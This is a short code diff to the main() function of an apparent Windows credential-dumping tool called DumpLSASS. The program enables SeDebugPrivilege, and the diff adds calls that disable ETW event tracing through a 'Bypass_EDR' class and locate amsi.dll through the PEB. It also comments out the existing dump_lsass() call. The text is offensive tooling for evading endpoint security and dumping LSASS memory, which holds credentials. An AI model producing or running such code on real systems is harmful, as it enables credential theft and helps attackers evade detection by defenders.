@@ -319,5 +319,14 @@ int main()
 
 	enable_privilege("SeDebugPrivilege");
 
-	dump_lsass();
+	printf("Disabling ETW\n");
+	Bypass_EDR byp = Bypass_EDR();
+	byp.disable_etw();
+	
+	void* amsi_addr = byp.GetModuleFromPEB(L"amsi.dll");
+	printf("Amsi DLL: %x\n", amsi_addr);
+
+	//dump_lsass();
+
+	printf("End DumpLSASS\n");
 }
